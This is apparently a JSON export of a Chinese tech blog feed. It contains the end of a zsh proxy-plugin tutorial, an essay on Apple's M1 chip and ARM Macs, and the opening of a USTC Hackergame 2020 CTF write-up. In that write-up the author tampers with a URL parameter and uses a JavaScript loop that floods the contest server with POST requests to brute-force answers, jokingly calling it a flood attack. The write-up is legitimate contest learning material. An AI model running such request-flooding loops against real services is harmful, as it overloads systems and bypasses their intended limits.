class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\"> <div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-07</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\"> <div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-11</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  